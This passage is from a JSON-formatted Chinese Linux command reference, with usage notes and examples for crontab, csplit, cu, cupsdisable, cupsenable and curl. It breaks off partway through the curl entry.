class=\"hljs-symbol\">45 </span><span class=\"hljs-number\">4</span> <span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">22</span> * * /etc/init.d/smb restart\n</code></pre>\n<p>每周六、周日的1:10重启smb</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">10 </span><span class=\"hljs-number\">1</span> * * <span class=\"hljs-number\">6</span>,<span class=\"hljs-number\">0</span> /etc/init.d/smb restart\n</code></pre>\n<p>每天18&nbsp;:&nbsp;00至23&nbsp;:&nbsp;00之间每隔30分钟重启smb&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">0</span>,<span class=\"hljs-number\">30</span> <span class=\"hljs-number\">18</span>-<span class=\"hljs-number\">23</span> * * * /etc/init.d/smb restart\n</code></pre>\n<p>每星期六的晚上11:00&nbsp;pm重启smb&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">0 </span><span class=\"hljs-number\">23</span> * * <span class=\"hljs-number\">6</span> /etc/init.d/smb restart\n</code></pre>\n<p>每一小时重启smb&nbsp;</p>\n<pre><code class=\"language-shell\">* *<span class=\"hljs-regexp\">/1 * * * /</span>etc<span class=\"hljs-regexp\">/init.d/</span>smb restart\n</code></pre>\n<p>晚上11点到早上7点之间，每隔一小时重启smb</p>\n<pre><code class=\"language-shell\">* <span class=\"hljs-number\">23</span>-<span class=\"hljs-number\">7</span><span class=\"hljs-regexp\">/1 * * * /</span>etc<span class=\"hljs-regexp\">/init.d/</span>smb restart\n</code></pre>\n<p>每月的4号与每周一到周三的11点重启smb&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">0 </span><span class=\"hljs-number\">11</span> <span class=\"hljs-number\">4</span> * mon-wed /etc/init.d/smb restart\n</code></pre>\n<p>一月一号的4点重启smb</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">0 </span><span class=\"hljs-number\">4</span> <span class=\"hljs-number\">1</span> jan * /etc/init.d/smb restart\n</code></pre>\n<p>每小时执行<code>/etc/cron.hourly</code>目录内的脚本</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-symbol\">01 </span>* * * * root <span class=\"hljs-keyword\">run</span>-parts /etc/cron.hourly\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "csplit",
        "des": "将一个大文件分割成小的碎片文件",
        "body": "<h1 id=\"csplit\">csplit</h1>\n<p>将一个大文件分割成小的碎片文件</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>csplit命令</strong> 用于将一个大文件分割成小的碎片，并且将分割后的每个碎片保存成一个文件。碎片文件的命名类似“xx00”，“xx01”。csplit命令是split的一个变体，split只能够根据文件大小或行数来分割，但csplit能够根据文件本身特点来分割文件。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">csplit</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-b&lt;输出格式&gt;或<span class=\"hljs-params\">--suffix-format=</span>&lt;输出格式&gt;：预设的输出格式其文件名称为xx00，xx01等，用户可以通过改变&lt;输出格式&gt;来改变输出的文件名；\n-f&lt;输出字首字符串&gt;或<span class=\"hljs-params\">--prefix=</span>&lt;输出字首字符串&gt;：预设的输出字首字符串其文件名为xx00，xx01等，如果制定输出字首字符串为“hello”，则输出的文件名称会变成hello00，hello、01.<span class=\"hljs-string\">.....</span>\n-k或<span class=\"hljs-params\">--keep-files</span>：保留文件，就算发生错误或中断执行，与不能删除已经输出保存的文件；\n-n&lt;输出文件名位数&gt;或<span class=\"hljs-params\">--digits=</span>&lt;输出文件名位数&gt;：预设的输出文件名位数其文件名称为xx00，xx01.<span class=\"hljs-string\">.....</span>如果用户指定输出文件名位数为“3”，则输出的文件名称会变成xx000，xx001等；\n-q或-s或<span class=\"hljs-params\">--quiet</span>或——silent：不显示指令执行过程；\n-z或<span class=\"hljs-params\">--elide-empty-files</span>：删除长度为0 Byte文件。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件：指定要分割的原文件；</li>\n<li>  模式：指定要分割文件时的匹配模式。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>示例测试文件 server.log</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cat</span> server.log\nSERVER-<span class=\"hljs-number\">1</span>\n[con] <span class=\"hljs-number\">10.10.10.1</span> suc\n[con] <span class=\"hljs-number\">10.10.10.2</span> fai\n[dis] <span class=\"hljs-number\">10.10.10.3</span> pen\n[con] <span class=\"hljs-number\">10.10.10.4</span> suc\nSERVER-<span class=\"hljs-number\">2</span>\n[con] <span class=\"hljs-number\">10.10.10.5</span> suc\n[con] <span class=\"hljs-number\">10.10.10.6</span> fai\n[dis] <span class=\"hljs-number\">10.10.10.7</span> pen\n[con] <span class=\"hljs-number\">10.10.10.8</span> suc\nSERVER-<span class=\"hljs-number\">3</span>\n[con] <span class=\"hljs-number\">10.10.10.9</span> suc\n[con] <span class=\"hljs-number\">10.10.10.10</span> fai\n[dis] <span class=\"hljs-number\">10.10.10.11</span> pen\n[con] <span class=\"hljs-number\">10.10.10.12</span> suc\n</code></pre>\n<p>需要将server.log分割成server1.log、server2.log、server3.log，这些文件的内容分别取自原文件中不同的SERVER部分：</p>\n<pre><code class=\"language-shell\">[root@localhost split]# csplit <span class=\"hljs-keyword\">server</span>.<span class=\"hljs-keyword\">log</span> /<span class=\"hljs-keyword\">SERVER</span>/ -n2 -s {*} -f <span class=\"hljs-keyword\">server</span> -b \"%02d.log\"; rm server00.<span class=\"hljs-keyword\">log</span>\n[root@localhost split]# ls\nserver01.<span class=\"hljs-keyword\">log</span>  server02.<span class=\"hljs-keyword\">log</span>  server03.<span class=\"hljs-keyword\">log</span>  <span class=\"hljs-keyword\">server</span>.<span class=\"hljs-keyword\">log</span>\n</code></pre>\n<p> <strong>命令详细说明：</strong> </p>\n<pre><code class=\"language-shell\">/[正则表达式]/   <span class=\"hljs-comment\">#匹配文本样式，比如/SERVER/，从第一行到包含SERVER的匹配行。</span>\n{*}     <span class=\"hljs-comment\">#表示根据匹配重复执行分割，直到文件尾停止，使用{整数}的形式指定分割执行的次数。</span>\n<span class=\"hljs-literal\">-</span>s      <span class=\"hljs-comment\">#静默模式，不打印其他信息。</span>\n<span class=\"hljs-literal\">-</span>n      <span class=\"hljs-comment\">#指定分割后的文件名后缀的数字个数。比如01、02、03等。</span>\n<span class=\"hljs-literal\">-</span>f      <span class=\"hljs-comment\">#指定分割后的文件名前缀。</span>\n<span class=\"hljs-literal\">-</span>b      <span class=\"hljs-comment\">#指定后缀格式。比如%02d.log，类似于C语言中的printf参数格式。</span>\nrm server00.log    <span class=\"hljs-comment\">#是删除第一个文件，因为分割后的的第一个文件没有内容，匹配的单词就位于文件的第一行中。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cu",
        "des": "用于连接另一个系统主机",
        "body": "<h1 id=\"cu\">cu</h1>\n<p>用于连接另一个系统主机</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cu命令</strong> 用于连接另一个系统主机。cu(call up)指令可连接另一台主机，并采用类似拨号终端机的接口工作，也可执行简易的文件传输作业。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">cu <span class=\"hljs-selector-attr\">[dehnotv]</span><span class=\"hljs-selector-attr\">[-a&lt;通信端口&gt;]</span><span class=\"hljs-selector-attr\">[-c&lt;电话号码&gt;]</span><span class=\"hljs-selector-attr\">[-E&lt;脱离字符&gt;]</span><span class=\"hljs-selector-attr\">[-I&lt;设置文件&gt;]</span><span class=\"hljs-selector-attr\">[-l&lt;外围设备代号&gt;]</span>\n<span class=\"hljs-selector-attr\">[-s&lt;连线速率&gt;]</span><span class=\"hljs-selector-attr\">[-x&lt;排错模式&gt;]</span><span class=\"hljs-selector-attr\">[-z&lt;系统主机&gt;]</span><span class=\"hljs-selector-attr\">[--help]</span><span class=\"hljs-selector-attr\">[-nostop]</span><span class=\"hljs-selector-attr\">[--parity=none]</span><span class=\"hljs-selector-attr\">[&lt;系统主机&gt;/&lt;电话号码&gt;]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-a<span class=\"hljs-variable\">&lt;通信端口&gt;</span>或-p<span class=\"hljs-variable\">&lt;通信端口&gt;</span>或--port<span class=\"hljs-variable\">&lt;通信端口&gt;</span> 使用指定的通信端口进行连线。\n-c<span class=\"hljs-variable\">&lt;电话号码&gt;</span>或--phone<span class=\"hljs-variable\">&lt;电话号码&gt;</span> 拨打该电话号码。\n-d 进入排错模式。\n-e或--parity=even 使用双同位检查。\n-E<span class=\"hljs-variable\">&lt;脱离字符&gt;</span>或--escape<span class=\"hljs-variable\">&lt;脱离字符&gt;</span> 设置脱离字符。\n-h或--halfduple 使用半双工模式。\n-I<span class=\"hljs-variable\">&lt;配置文件&gt;</span>或--config<span class=\"hljs-variable\">&lt;配置文件&gt;</span> 指定要使用的配置文件。\n-l<span class=\"hljs-variable\">&lt;外围设备代号&gt;</span>或--line<span class=\"hljs-variable\">&lt;外围设备代号&gt;</span> 指定某项外围设备，作为连接的设备。\n-n或--prompt 拨号时等待用户输入电话号码。\n-o或--parity=odd 使用单同位检查。\n-s<span class=\"hljs-variable\">&lt;连线速率&gt;</span>或--speed<span class=\"hljs-variable\">&lt;连线速率&gt;</span>或--baud<span class=\"hljs-variable\">&lt;连线速率&gt;</span>或-<span class=\"hljs-variable\">&lt;连线速率&gt;</span> 设置连线的速率，单位以鲍率计算。\n-t或--maper 把CR字符置换成LF+CR字符。\n-v或--version 显示版本信息。\n-x<span class=\"hljs-variable\">&lt;排错模式&gt;</span>或--debug<span class=\"hljs-variable\">&lt;排错模式&gt;</span> 使用排错模式。\n-z<span class=\"hljs-variable\">&lt;系统主机&gt;</span>或--system<span class=\"hljs-variable\">&lt;系统主机&gt;</span> 连接该系统主机。\n--help 在线帮助。\n--nostop 关闭X<span class=\"hljs-keyword\">on</span>/Xoff软件流量控制。\n--parity=<span class=\"hljs-keyword\">none</span> 不使用同位检查。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>与远程主机连接</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">cu</span> -c <span class=\"hljs-number\">0102377765</span>\n<span class=\"hljs-attribute\">cu</span> -s <span class=\"hljs-number\">38400</span> <span class=\"hljs-number\">9</span>=<span class=\"hljs-number\">12015551234</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "cupsdisable",
        "des": "停止指定的打印机",
        "body": "<h1 id=\"cupsdisable\">cupsdisable</h1>\n<p>停止指定的打印机</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cupsdisable命令</strong> 用于停止指定的打印机。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cupsdisable</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：当连接到服务器时强制使用加密；</span>\n<span class=\"hljs-deletion\">-U：指定连接服务器时使用的用户名；</span>\n<span class=\"hljs-deletion\">-u：指定打印任务所属的用户；</span>\n<span class=\"hljs-deletion\">-c：取消指定打印机的所有打印任务；</span>\n<span class=\"hljs-deletion\">-h：指定连接的服务器名和端口号；</span>\n<span class=\"hljs-deletion\">-r：停止打印机的原因。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标：指定目标打印机。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "cupsenable",
        "des": "启动指定的打印机",
        "body": "<h1 id=\"cupsenable\">cupsenable</h1>\n<p>启动指定的打印机</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>cupsenable命令</strong> 用于启动指定的打印机。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">cupsenable</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-E：当连接到服务器时强制使用加密；</span>\n<span class=\"hljs-deletion\">-U：指定连接服务器时使用的用户名；</span>\n<span class=\"hljs-deletion\">-u：指定打印任务所属的用户；</span>\n<span class=\"hljs-deletion\">-h：指定连接的服务器名和端口号；</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>目标：指定目标打印机。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "curl",
        "des": "利用URL规则在命令行下工作的文件传输工具",
        "body": "<h1 id=\"curl\">curl</h1>\n<p>利用URL规则在命令行下工作的文件传输工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>curl命令</strong> 是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具。作为一款强力工具，curl支持包括HTTP、HTTPS、ftp等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。做网页处理流程和数据检索自动化，curl可以祝一臂之力。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">curl</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">\n\n<tbody>\n<tr><td>-a/--append</td><td>上传文件时，附加到目标文件</td></tr>\n<tr><td>-A/--user-agent <string></string></td><td>设置用户代理发送给服务器</td></tr>\n<tr><td>-anyauth</td><td>可以使用“任何”身份验证方法</td></tr>\n<tr><td>-b/--cookie <name=string file=\"\"></name=string></td><td>cookie字符串或文件读取位置</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--basic</td><td>使用HTTP基本验证</td></tr>\n<tr><td>-B/--use-ascii</td><td>使用ASCII /文本传输</td></tr>\n<tr><td>-c/--cookie-jar <file></file></td><td>操作结束后把cookie写入到这个文件中</td></tr>\n<tr><td>-C/--continue-at <offset></offset></td><td>断点续传</td></tr>\n<tr><td>-d/--data <data></data></td><td>HTTP POST方式传送数据</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--data-ascii <data></data></td><td>以ascii的方式post数据</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--data-binary <data></data></td><td>以二进制的方式post数据</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--negotiate</td><td>使用HTTP身份验证</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--digest</td><td>使用数字身份验证</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--disable-eprt</td><td>禁止使用EPRT或LPRT</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--disable-epsv</td><td>禁止使用EPSV</td></tr>\n<tr><td>-D/--dump-header <file></file></td><td>把header信息写入到该文件中</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--egd-file <file></file></td><td>为随机数据(SSL)设置EGD socket路径</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--tcp-nodelay</td><td>使用TCP_NODELAY选项</td></tr>\n<tr><td>-e/--referer</td><td>来源网址</td></tr>\n<tr><td>-E/--cert <cert:[passwd]></cert:[passwd]></td><td>客户端证书文件和密码 (SSL)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--cert-type <type></type></td><td>证书文件类型 (DER/PEM/ENG) (SSL)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--key <key></key></td><td>私钥文件名 (SSL)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--key-type <type></type></td><td>私钥文件类型 (DER/PEM/ENG) (SSL)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--pass <pass></pass></td><td>私钥密码 (SSL)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--engine <eng></eng></td><td>加密引擎使用 (SSL). \"--engine list\" for list</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--cacert <file></file></td><td>CA证书 (SSL)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--capath <directory></directory></td><td>CA目录 (made using c_rehash) to verify peer against (SSL)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ciphers <list></list></td><td>SSL密码</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--compressed</td><td>要求返回是压缩的形势 (using deflate or gzip)</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--connect-timeout <seconds></seconds></td><td>设置最大请求时间</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--create-dirs</td><td>建立本地目录的目录层次结构</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--crlf</td><td>上传是把LF转变成CRLF</td></tr>\n<tr><td>-f/--fail</td><td>连接失败时不显示http错误</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ftp-create-dirs</td><td>如果远程目录不存在，创建远程目录</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ftp-method [multicwd/nocwd/singlecwd]</td><td>控制CWD的使用</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ftp-pasv</td><td>使用 PASV/EPSV 代替端口</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ftp-skip-pasv-ip</td><td>使用PASV的时候,忽略该IP地址</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ftp-ssl</td><td>尝试用 SSL/TLS 来进行ftp数据传输</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ftp-ssl-reqd</td><td>要求用 SSL/TLS 来进行ftp数据传输</td></tr>\n<tr><td>-F/--form <name=content></name=content></td><td>模拟http表单提交数据</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--form-string <name=string></name=string></td><td>模拟http表单提交数据</td></tr>\n<tr><td>-g/--globoff</td><td>禁用网址序列和范围使用{}和[]</td></tr>\n<tr><td>-G/--get</td><td>以get的方式来发送数据</td></tr>\n<tr><td>-H/--header <line></line></td><td>自定义头信息传递给服务器</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ignore-content-length</td><td>忽略的HTTP头信息的长度</td></tr>\n<tr><td>-i/--include</td><td>输出时包括protocol头信息</td></tr>\n<tr><td>-I/--head</td><td>只显示请求头信息</td></tr>\n<tr><td>-j/--junk-session-cookies</td><td>读取文件进忽略session cookie</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--interface <interface></interface></td><td>使用指定网络接口/地址</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--krb4 <level></level></td><td>使用指定安全级别的krb4</td></tr>\n<tr><td>-k/--insecure</td><td>允许不使用证书到SSL站点</td></tr>\n<tr><td>-K/--config</td><td>指定的配置文件读取</td></tr>\n<tr><td>-l/--list-only</td><td>列出ftp目录下的文件名称</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--limit-rate <rate></rate></td><td>设置传输速度</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--local-port<num></num></td><td>强制使用本地端口号</td></tr>\n<tr><td>-m/--max-time <seconds></seconds></td><td>设置最大传输时间</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--max-redirs <num></num></td><td>设置最大读取的目录数</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--max-filesize <bytes></bytes></td><td>设置最大下载的文件总量</td></tr>\n<tr><td>-M/--manual</td><td>显示全手动</td></tr>\n<tr><td>-n/--netrc</td><td>从netrc文件中读取用户名和密码</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--netrc-optional</td><td>使用 .netrc 或者 URL来覆盖-n</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--ntlm</td><td>使用 HTTP NTLM 身份验证</td></tr>\n<tr><td>-N/--no-buffer</td><td>禁用缓冲输出</td></tr>\n<tr><td>-o/--output</td><td>把输出写到该文件中</td></tr>\n<tr><td>-O/--remote-name</td><td>把输出写到该文件中，保留远程文件的文件名</td></tr>\n<tr><td>-p/--proxytunnel</td><td>使用HTTP代理</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--proxy-anyauth</td><td>选择任一代理身份验证方法</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--proxy-basic</td><td>在代理上使用基本身份验证</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--proxy-digest</td><td>在代理上使用数字身份验证</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--proxy-ntlm</td><td>在代理上使用ntlm身份验证</td></tr>\n<tr><td>-P/--ftp-port <address></address></td><td>使用端口地址，而不是使用PASV</td></tr>\n<tr><td>-q</td><td>作为第一个参数，关闭 .curlrc</td></tr>\n<tr><td>-Q/--quote <cmd></cmd></td><td>文件传输前，发送命令到服务器</td></tr>\n<tr><td>-r/--range <range></range></td><td>检索来自HTTP/1.1或FTP服务器字节范围</td></tr>\n<tr><td>--range-file</td><td>读取（SSL）的随机文件</td></tr>\n<tr><td>-R/--remote-time</td><td>在本地生成文件时，保留远程文件时间</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--retry <num></num></td><td>传输出现问题时，重试的次数</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--retry-delay <seconds></seconds></td><td>传输出现问题时，设置重试间隔时间</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--retry-max-time <seconds></seconds></td><td>传输出现问题时，设置最大重试时间</td></tr>\n<tr><td>-s/--silent</td><td>静默模式。不输出任何东西</td></tr>\n<tr><td>-S/--show-error</td><td>显示错误</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--socks4 <host[:port]></host[:port]></td><td>用socks4代理给定主机和端口</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--socks5 <host[:port]></host[:port]></td><td>用socks5代理给定主机和端口</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--stderr <file></file></td><td>&nbsp;</td></tr>\n<tr><td>-t/--telnet-option <opt=val></opt=val></td><td>Telnet选项设置</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--trace <file></file></td><td>对指定文件进行debug</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--trace-ascii <file></file></td><td>Like --跟踪但没有hex输出</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--trace-time</td><td>跟踪/详细输出时，添加时间戳</td></tr>\n<tr><td>-T/--upload-file <file></file></td><td>上传文件</td></tr>\n<tr><td>&nbsp; &nbsp; &nbsp;--url <url></url></td><td>Spet URL to work with</td></tr>\n<tr><td>-u/--user <user[:password]></user[:password]></td><td>设置服务器的用户和密码</td></tr>\n<tr><td>-U/--proxy-user <user[:password]></user[:password]></td><td>设置代理用户名和密码</td></tr>\n<tr><td>-w/--write-out [format]</td><td>什么输出完成后</td></tr>\n<tr><td>-x/--proxy <host[:port]></host[:port]></td><td>在给定的端口上使用HTTP代理</td></tr>\n<tr><td>-X/--request <command></command></td><td>指定什么命令</td></tr>\n<tr><td>-y/--speed-time</td><td>放弃限速所要的时间，默认为30</td></tr>\n<tr><td>-Y/--speed-limit</td><td>停止传输速度的限制，速度时间</td></tr>\n</tbody>\n\n</table>\n\n<h3 id=\"实例\">实例</h3>\n<p><strong>文件下载</strong></p>\n<p>curl命令可以用来执行下载、发送各种HTTP请求，指定HTTP头部等操作。如果系统没有curl可以使用<code>yum install curl</code>安装，也可以下载安装。curl是将下载文件输出到stdout，将进度信息输出到stderr，不显示进度信息使用<code>--silent</code>选项。</p>\n<pre><code class=\"language-shell\">curl <span class=\"hljs-built_in\">URL</span> <span class=\"hljs-comment\">--silent</span>\n</code></pre>\n<p>这条命令是将下载文件输出到终端，所有下载的数据都被写入到stdout。</p>\n<p>使用选项<code>-O</code>将下载的数据写入到文件，必须使用文件的绝对地址：</p>\n<pre><code class=\"language-shell\">curl <span class=\"hljs-keyword\">http</span>://example.com/<span class=\"hljs-keyword\">text</span>.iso <span class=\"hljs-comment\">--silent -O</span>\n</code></pre>\n<p>选项<code>-o</code>将下载数据写入到指定名称的文件中，并使用<code>--progress</code>显示进度条：</p>\n<pre><code class=\"language-shell\">curl http:<span class=\"hljs-comment\">//example.com/test.iso -o filename.iso --progress</span>\n######################################### <span class=\"hljs-number\">100.0</span>%\n</code></pre>\n<p><strong>不输出错误和进度信息</strong></p>\n<p><code>-s</code> 参数将不输出错误和进度信息。</p>\n<pre><code class=\"language-shell\">curl -s https:<span class=\"hljs-regexp\">//</span>www.example.com\n<span class=\"hljs-comment\"># 上面命令一旦发生错误，不会显示错误信息。不发生错误的话，会正常显示运行结果。</span>\n</code></pre>\n<p>如果想让 curl 不产生任何输出，可以使用下面的命令。</p>\n<pre><code class=\"language-shell\">curl -s -o <span class=\"hljs-regexp\">/dev/</span>null https:<span class=\"hljs-regexp\">//g</span>oogle.com\n</code></pre>\n<p><strong>断点续传</strong></p>\n<p>curl能够从特定的文件偏移处继续下载，它可以通过指定一个便宜量来下载部分文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">curl</span> <span class=\"hljs-built_in\">URL</span><span class=\"hljs-operator\">/</span><span class=\"hljs-built_in\">File</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-built_in\">C</span> 偏移量\n\n<span class=\"hljs-type\">#</span>偏移量是以字节为单位的整数，如果让<span class=\"hljs-variable\">curl</span>自动推断出正确的续传位置使用<span class=\"hljs-operator\">-</span><span class=\"hljs-built_in\">C</span> <span class=\"hljs-operator\">-</span>：\n<span class=\"hljs-variable\">curl</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-built_in\">C</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-built_in\">URL</span>\n</code></pre>\n<p><strong>使用curl设置参照页字符串</strong></p>\n<p>参照页是位于HTTP头部中的一个字符串，用来表示用户是从哪个页面到达当前页面的，如果用户点击网页A中的某个连接，那么用户就会跳转到B网页，网页B头部的参照页字符串就包含网页A的URL。</p>\n<p>使用<code>--referer</code>选项指定参照页字符串：</p>\n<pre><code class=\"language-shell\">curl --referer http:<span class=\"hljs-regexp\">//</span>www.google.com http:<span class=\"hljs-regexp\">//</span>wangchujiang.com\n</code></pre>\n<p><strong>用curl设置用户代理字符串</strong></p>\n<p>有些网站访问会提示只能使用IE浏览器来访问，这是因为这些网站设置了检查用户代理，可以使用curl把用户代理设置为IE，这样就可以访问了。使用<code>--user-agent</code>或者<code>-A</code>选项：</p>\n<pre><code class=\"language-shell\">curl <span class=\"hljs-built_in\">URL</span> <span class=\"hljs-comment\">--user-agent \"Mozilla/5.0\"</span>\ncurl <span class=\"hljs-built_in\">URL</span> -A <span class=\"hljs-string\">\"Mozilla/5.0\"</span>\n</code></pre>\n<p>其他HTTP头部信息也可以使用curl来发送，使用<code>-H</code>\"头部信息\" 传递多个头部信息，例如：</p>\n<pre><code class=\"language-shell\">curl -H <span class=\"hljs-string\">\"Host:wangchujiang.com\"</span> -H <span class=\"hljs-string\">\"accept-language:zh-cn\"</span> <span class=\"hljs-built_in\">URL</span>\n</code></pre>\n<p><strong>curl的带宽控制和下载配额</strong></p>\n<p>使用<code>--limit-rate</code>限制curl的下载速度：</p>\n<pre><code class=\"language-shell\">curl <span class=\"hljs-built_in\">URL</span> <span class=\"hljs-comment\">--limit-rate 50k</span>\n</code></pre>\n<p>命令中用k（千字节）和m（兆字节）指定下载速度限制。</p>\n<p>使用<code>--max-filesize</code>指定可下载的最大文件大小：</p>\n<pre><code class=\"language-shell\">curl <span class=\"hljs-built_in\">URL</span> <span class=\"hljs-comment\">--max-filesize bytes</span>\n</code></pre>\n<p>如果文件大小超出限制，命令则返回一个非0退出码，如果命令正常则返回0。</p>\n<pre><code class=\"language-shell\">curl --limit-rate <span class=\"hljs-number\">200</span>k https:<span class=\"hljs-regexp\">//</span>example.com\n<span class=\"hljs-comment\"># 上面命令将带宽限制在每秒 200K 字节。</span>\n</code></pre>\n<p><strong>用curl进行认证</strong></p>\n<p>使用curl选项&nbsp;-u&nbsp;可以完成HTTP或者FTP的认证，可以指定密码，也可以不指定密码在后续操作中输入密码：</p>\n<pre><code class=\"language-shell\">curl -u user:pwd http:<span class=\"hljs-regexp\">//</span>wangchujiang.com\ncurl -u user http:<span class=\"hljs-regexp\">//</span>wangchujiang.com\n</code></pre>\n<p><strong>只打印响应头部信息</strong></p>\n<p>通过<code>-I</code>或者<code>-head</code>可以只打印出HTTP头部信息：</p>\n<pre><code class=\"language-shell\">[root@localhost <span class=\"hljs-type\">text</span>]# curl -I http://wangchujiang.com\nHTTP/<span class=\"hljs-number\">1.1</span> <span class=\"hljs-number\">200</span> OK\n<span class=\"hljs-keyword\">Server</span>: nginx/<span class=\"hljs-number\">1.2</span><span class=\"hljs-number\">.5</span>\n<span class=\"hljs-type\">date</span>: Mon, <span class=\"hljs-number\">10</span> <span class=\"hljs-type\">Dec</span> <span class=\"hljs-number\">2012</span> <span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">24</span>:<span class=\"hljs-number\">34</span> GMT\nContent-<span class=\"hljs-keyword\">Type</span>: <span 